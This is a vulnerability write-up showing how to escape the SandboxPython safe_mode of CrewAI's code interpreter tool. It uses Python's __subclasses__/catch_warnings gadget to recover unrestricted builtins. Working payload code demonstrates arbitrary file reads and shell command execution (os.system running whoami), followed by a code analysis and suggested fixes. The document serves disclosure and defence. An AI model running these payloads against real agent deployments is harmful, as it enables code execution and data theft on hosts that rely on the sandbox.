# CrewAI SandboxPython Sandbox Bypass Exploration

## Preface

Most AI components/applications are based on the Python language, but they also require execution functionality, which makes sandboxes indispensable. Among the many recently disclosed vulnerabilities, sandbox escapes account for a significant portion. Thus, I began exploring sandbox escapes in other AI frameworks.

## Vulnerability Description

CrewAI's CodeInterpreterTool provides two execution modes: unsafe_mode (executes code directly on the host machine) and safe_mode (executes code using a restricted sandbox). safe_mode uses the `SandboxPython` class to implement Python code sandbox isolation. This sandbox provides basic code execution security by restricting dangerous module imports and removing dangerous built-in functions.

**Root Cause**: The `SandboxPython` sandbox implementation has design flaws. We can access internal objects (such as the `catch_warnings` class) through Python object inheritance chains (`__class__`, `__bases__`, `__subclasses__`), and then access the original, unrestricted `__builtins__` dictionary through the `__init__.__globals__` attribute of that class. This allows attackers to bypass all restrictions in safe_mode, achieving arbitrary code execution, arbitrary file read/write, and importing dangerous modules.

## Environment Setup

We'll only verify the sandbox part.

Just install the crewai_tools package.

### Environment Verification

Verification:

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython
print('SandboxPython imported successfully')
print('Blocked modules:', SandboxPython.BLOCKED_MODULES)
print('Unsafe builtins:', SandboxPython.UNSAFE_BUILTINS)
```

![Sandbox Restrictions](https://gitee.com/nn0nkey/picture/raw/master/img/20260116145103887.png)

These are the sandbox restrictions.

## Vulnerability Reproduction

### Step-by-Step Reproduction

#### Verify Sandbox Restrictions

Let's verify if the sandbox works:

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

# Try to import os module in the sandbox (should be blocked)
code = """
import os
result = "os imported"
"""
exec_locals = {}
SandboxPython.exec(code=code, locals=exec_locals)
```

Execution result:

![Blocked Import](https://gitee.com/nn0nkey/picture/raw/master/img/20260116151005810.png)

The sandbox blocked the direct import of the `os` module.

Of course, for those who have played CTF, bypassing the sandbox is not difficult. Let's start bypassing it now.

#### Finding warnings.catch_warnings

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

code = """
# Access tuple class's inheritance chain
# tuple -> __class__ -> __bases__[0] -> object -> __subclasses__()
subclasses = ().__class__.__bases__[0].__subclasses__()
result = subclasses
"""
exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(exec_locals['result'])
```

![Subclasses List](https://gitee.com/nn0nkey/picture/raw/master/img/20260116151503951.png)

We accessed Python object's inheritance chain and obtained a list of all subclasses.

Then we search for warnings.catch_warnings:

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

code = """
subclasses = ().__class__.__bases__[0].__subclasses__()
for i, cls in enumerate(subclasses):
    if 'catch_warnings' in cls.__name__:
        result = f"Found catch_warnings at index {i}"
        break
"""
exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(exec_locals['result'])
```

Execution result:
```
Found catch_warnings at index 146
```

We found it at index 146. Let's use this class to obtain malicious functions:

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

code = """
subclasses = ().__class__.__bases__[0].__subclasses__()[146]
"""
exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(exec_locals['subclasses'])
```

![catch_warnings Class](https://gitee.com/nn0nkey/picture/raw/master/img/20260116151801718.png)

#### Obtaining Malicious Functions

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

code = """
subclasses = ().__class__.__bases__[0].__subclasses__()[146].__init__.__globals__['__builtins__']
"""
exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(exec_locals['subclasses'])
```

**open**

![open Function](https://gitee.com/nn0nkey/picture/raw/master/img/20260116151917789.png)

**`__import__`** can directly import the os module:

![__import__ Function](https://gitee.com/nn0nkey/picture/raw/master/img/20260116151947323.png)

**eval** can directly execute expressions:

![eval Function](https://gitee.com/nn0nkey/picture/raw/master/img/20260116152029598.png)

#### Arbitrary File Read

```python
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

with open('/tmp/test_secret.txt', 'w') as f:
    f.write('SECRET_FILE_CONTENT')

# Then read in the sandbox
code = """
subclasses = ().__class__.__bases__[0].__subclasses__()
warnings_class = None
for cls in subclasses:
    if 'catch_warnings' in cls.__name__:
        warnings_class = cls
        break

original_builtins = warnings_class.__init__.__globals__['__builtins__']
open_func = original_builtins['open']

with open_func('/tmp/test_secret.txt', 'r') as f:
    content = f.read()
result = f"SUCCESS_READ: {content}"
"""
exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(exec_locals['result'])
```

#### Code Execution

```python
import textwrap
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

code = textwrap.dedent("""
    # 1. Access object class and get all subclasses
    # ().__class__.__bases__[0] is equivalent to object
    subclasses = ().__class__.__bases__[0].__subclasses__()

    warnings_class = None

    # 2. Iterate through subclasses to find 'catch_warnings' (a commonly used Gadget)
    for cls in subclasses:
        if 'catch_warnings' in cls.__name__:
            warnings_class = cls
            break

    if warnings_class:
        # 3. Restore original __builtins__ from catch_warnings's global variables
        original_builtins = warnings_class.__init__.__globals__['__builtins__']

        # 4. Use original __import__ to import os module
        import_func = original_builtins['__import__']
        os_module = import_func("os")

        # 5. Execute system command
        system_func = getattr(os_module, "system")
        # Execute whoami and write to file
        system_func("whoami > /tmp/test.txt")

        result = "RCE_SUCCESS"
    else:
        result = "GADGET_NOT_FOUND"
""")

print("[*] Payload constructed. Executing via SandboxPython...")

exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(f"[*] Exploit Status: {exec_locals.get('result')}")
try:
    with open('/tmp/test.txt', 'r') as f:
        print(f"[*] Command Output (whoami): {f.read().strip()}")
except FileNotFoundError:
    print("[!] /tmp/test.txt not found. (Code might be running in an isolated container?)")
```

![RCE Success](https://gitee.com/nn0nkey/picture/raw/master/img/20260116154116424.png)

## Vulnerability Analysis

### Code Analysis

#### SandboxPython Class Definition

**File Location**: `crewai-tools/src/crewai_tools/tools/code_interpreter_tool/code_interpreter_tool.py`

```python
class SandboxPython:
    """A restricted Python execution environment for running code safely.

    This class provides methods to safely execute Python code by restricting access to
    potentially dangerous modules and built-in functions. It creates a sandboxed
    environment where harmful operations are blocked.
    """

    BLOCKED_MODULES: ClassVar[set[str]] = {
        "os",
        "sys",
        "subprocess",
        "shutil",
        "importlib",
        "inspect",
        "tempfile",
        "sysconfig",
        "builtins",
    }

    UNSAFE_BUILTINS: ClassVar[set[str]] = {
        "exec",
        "eval",
        "open",
        "compile",
        "input",
        "globals",
        "locals",
        "vars",
        "help",
        "dir",
    }
```

The logic is straightforward: it defines which modules cannot be used and which BUILTINS functions cannot be used.

#### exec Function

**File Location**: `crewai-tools/src/crewai_tools/tools/code_interpreter_tool/code_interpreter_tool.py`

```python
@staticmethod
def exec(code: str, locals: dict[str, Any]) -> None:
    """Executes Python code in a restricted environment.

    Args:
        code: The Python code to execute as a string.
        locals: A dictionary that will be used for local variable storage.
    """
    exec(code, {"__builtins__": SandboxPython.safe_builtins()}, locals)  # ← Vulnerability point
```

It creates a restricted `__builtins__` dictionary, but objects in the execution environment can still access their internal attributes. There are no restrictions on accessing special attributes like `__class__`, `__bases__`, `__subclasses__`, etc.

### Overall Data Flow

```
(code="subclasses = ().__class__.__bases__[0].__subclasses__()")
    │
    ▼
SandboxPython.exec(code, locals)
    │
    │ exec(code, {"__builtins__": safe_builtins}, locals)
    │    ↓
    │ Execution environment uses restricted __builtins__
    │    ↓
    │ But objects in code (()) still have complete attributes
    ▼
Access __class__ attribute
    │
    ▼
Access __bases__ attribute
    │
    ▼
Access __subclasses__() method
    │
    ▼
Find catch_warnings class
    │
    ▼
Access catch_warnings.__init__.__globals__
    │
    │ → This is a module-level global namespace
    │ → Contains original __builtins__!
    ▼
original_builtins = warnings_class.__init__.__globals__['__builtins__']
    │
    │ Now we have unrestricted __builtins__:
    │ - original_builtins['open']      → Can read arbitrary files
    │ - original_builtins['eval']      → Can execute arbitrary code
    │ - original_builtins['__import__'] → Can import arbitrary modules
    ▼
```

## Vulnerability Fix

**Affected Version**: crewai-tools <= 1.0.0a2

**Fixed Version**: To be released

### Fix Recommendations

**Root Cause**:
- Python sandbox mechanisms are notoriously difficult to implement perfectly
- Internal attributes of objects (`__class__`, `__bases__`, `__globals__`, etc.) cannot be completely restricted
- Even after replacing `__builtins__`, the original version can still be accessed through other loaded objects

**Recommended Fix Approach**:

1. **Use Docker Containers as the Only Isolation Mechanism**
   - Completely remove the use of `SandboxPython`
   - Require Docker to be available, otherwise refuse to execute code
   - This provides true operating system-level isolation

2. Or use a more robust SandboxPython implementation:

```python
import ast
import re

class SandboxPython:
    """A more secure Python sandbox implementation (still not recommended for production)"""

    # Blocked attribute access patterns
    BLOCKED_ATTRS = {
        '__class__', '__bases__', '__subclasses__',
        '__globals__', '__code__', '__closure__',
        '__import__', '__builtins__', '__getattribute__',
    }

    @staticmethod
    def _validate_ast(node: ast.AST) -> bool:
        """Validate code for dangerous patterns using AST

        Args:
            node: AST node

        Returns:
            True if code is safe, False if contains dangerous patterns

        Raises:
            ValueError: If code contains dangerous patterns
        """
        class DangerDetector(ast.NodeVisitor):
            def __init__(self):
                self.has_danger = False
                self.danger_reason = []

            def visit_Attribute(self, node: ast.Attribute):
                # Check attribute access
                if isinstance(node.attr, str) and node.attr in SandboxPython.BLOCKED_ATTRS:
                    self.has_danger = True
                    self.danger_reason.append(f"Blocked attribute access: {node.attr}")
                self.generic_visit(node)

            def visit_Import(self, node: ast.Import):
                self.has_danger = True
                self.danger_reason.append("Import statement not allowed")

            def visit_ImportFrom(self, node: ast.ImportFrom):
                self.has_danger = True
                self.danger_reason.append("Import from statement not allowed")

        detector = DangerDetector()
        detector.visit(node)

        if detector.has_danger:
            raise ValueError(f"Code contains dangerous patterns: {detector.danger_reason}")

        return True

    @staticmethod
    def exec(code: str, locals: dict[str, Any]) -> None:
        """Execute code in a restricted environment

        Args:
            code: Python code to execute
            locals: Local variable dictionary

        Raises:
            ValueError: If code contains dangerous patterns
        """
        # Step 1: Parse code into AST
        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            raise ValueError(f"Syntax error in code: {e}")

        # Step 2: Validate AST for dangerous patterns
        SandboxPython._validate_ast(tree)

        # Step 3: Compile and execute code
        compiled_code = compile(tree, '<string>', 'exec')

        # Create restricted execution environment
        safe_builtins = SandboxPython._create_safe_builtins()
        execution_globals = {"__builtins__": safe_builtins}

        # Execute code
        exec(compiled_code, execution_globals, locals)

    @staticmethod
    def _create_safe_builtins() -> dict:
        """Create safe builtins dictionary

        Only includes absolutely safe built-in functions.
        """
        import builtins

        # Whitelist: only allow these built-in functions
        ALLOWED_BUILTINS = {
            'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray',
            'bytes', 'chr', 'complex', 'dict', 'divmod', 'enumerate',
            'filter', 'float', 'format', 'frozenset', 'hex', 'int',
            'isinstance', 'issubclass', 'iter', 'len', 'list', 'map',
            'max', 'min', 'next', 'oct', 'ord', 'pow', 'print', 'range',
            'repr', 'reversed', 'round', 'set', 'slice', 'sorted', 'str',
            'sum', 'tuple', 'type', 'zip',
        }

        safe_builtins = {
            k: v for k, v in builtins.__dict__.items()
            if k in ALLOWED_BUILTINS
        }

        # Use restricted __import__
        def safe_import(name, *args, **kwargs):
            BLOCKED = {'os', 'sys', 'subprocess', 'shutil', 'importlib'}
            if name in BLOCKED:
                raise ImportError(f"Importing '{name}' is not allowed")
            return __import__(name, *args, **kwargs)

        safe_builtins['__import__'] = safe_import
        return safe_builtins
```

## Disclaimer

This is for technical sharing only. Please do not abuse.
